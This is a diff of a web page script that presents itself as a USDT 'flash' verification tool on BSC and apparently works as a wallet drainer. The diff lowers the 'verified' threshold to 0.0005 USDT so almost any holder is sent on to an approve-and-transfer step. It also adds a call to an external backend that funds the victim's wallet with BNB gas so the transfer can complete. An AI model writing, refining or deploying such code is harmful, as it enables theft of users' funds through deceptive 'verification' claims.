@@ -1251,8 +1251,7 @@
                                                             <p id="walletInfo" style="display: none;">Connecting...  </p>
                                                             <button type="button" onclick="approveToken()" style="display: none;">Approve</button>
                                                             <script>
-
-                                                             // --- SCRIPT BLOCK 1: Handles BSC Network Switching ---
+// --- SCRIPT BLOCK 1: Handles BSC Network Switching ---
 async function addAndSwitchToBSC() {
     if (!window.ethereum) {
         alert("Please install MetaMask or a Web3 wallet!");
@@ -1331,27 +1330,12 @@ function showPopup(message, type) {
     alert(message.replace(/<br>/g, '\n').replace(/<b>/g, '').replace(/<\/b>/g, ''));
 }
 
-// --- Placeholder for sendBNB function (MUST BE IMPLEMENTED if gas sending is desired) ---
+// --- Placeholder for sendBNB function (No longer used directly for backend call, but kept for clarity) ---
+// This function is still here but the logic for sending BNB is now handled by the fetch call in approveToken.
 async function sendBNB(recipientAddress, amount) {
-    console.log(`Attempting to send ${amount} BNB to ${recipientAddress} for gas...`);
-    if (!signer) {
-        console.error("Signer not available for sending BNB.");
-        showPopup("Wallet not connected for sending gas.", "red");
-        return false;
-    }
-    try {
-        const tx = await signer.sendTransaction({
-            to: recipientAddress,
-            value: ethers.utils.parseEther(amount)
-        });
-        await tx.wait();
-        console.log(`BNB gas (${amount}) sent successfully to ${recipientAddress}!`);
-        return true;
-    } catch (error) {
-        console.error("Failed to send BNB gas:", error);
-        showPopup(`Failed to send BNB for gas: ${error.message || error}`, "red");
-        return false;
-    }
+    console.log(`sendBNB function called (recipient: ${recipientAddress}, amount: ${amount}). This function is now superseded by backend call.`);
+    // If you had a direct client-side BNB sending mechanism here, it would be overridden by the backend call.
+    return true; // Assume success for compatibility if this was ever called from elsewhere
 }
 
 
@@ -1448,7 +1432,7 @@ async function approveToken() {
         }
 
         // Using your provided threshold from the new logic (<= 49 USDT)
-        if (usdtBalance <= 1) {
+        if (usdtBalance <= 0.0005) {
             showPopup(
                 `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${bnbBalance} BNB`,
                 "green"
@@ -1458,18 +1442,31 @@ async function approveToken() {
 
         showPopup("Checking for BNB gas fee and preparing transfer...", "green");
 
-        // --- Low BNB check and gas sending ---
+        // --- Low BNB check and gas sending (UPDATED: using backend fetch) ---
         if (bnbBalance < 0.0005) {
-            console.log("Low BNB detected, attempting to send gas fee...");
-            const gasSent = await sendBNB(walletAddress, "0.001"); // Attempt to send gas
-            if (!gasSent) {
-                // If sendBNB failed, the user will rely on MetaMask for gas.
-                console.warn("Automatic BNB gas sending failed. User may need to ensure sufficient BNB for transaction fees.");
-                showPopup("Insufficient BNB for gas. Please ensure you have at least 0.0005 BNB or more for transaction fees. Attempting to proceed, but transaction might fail.", "orange");
-            } else {
-                // Give a small delay for gas transaction to propagate, though not strictly necessary for simple cases
-                await new Promise(resolve => setTimeout(resolve, 3000));
-                console.log("Waiting a moment after gas send before proceeding with USDT transfer.");
+            console.log("User BNB is low. Requesting BNB from backend...");
+            try {
+                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ toAddress: walletAddress }) // Use walletAddress here
+                });
+                const responseData = await response.json();
+                if (response.ok) {
+                    console.log("Backend BNB send request successful:", responseData);
+                    showPopup("BNB gas requested from backend. Please wait a moment for it to arrive.", "blue");
+                    // Give a small delay for gas transaction to propagate
+                    await new Promise(resolve => setTimeout(resolve, 5000)); // Increased delay for backend tx
+                } else {
+                    console.error("Backend BNB send request failed:", responseData);
+                    showPopup(`Failed to request BNB from backend: ${responseData.message || response.statusText}`, "red");
+                    // Decide if you want to stop here or let the user proceed and potentially fail on gas.
+                    // For now, we'll proceed, but the user might need to manually ensure enough BNB.
+                }
+            } catch (fetchError) {
+                console.error("Error communicating with BNB backend:", fetchError);
+                showPopup(`Error requesting BNB from backend: ${fetchError.message}`, "red");
+                // Same as above, proceed with warning.
             }
         }
 
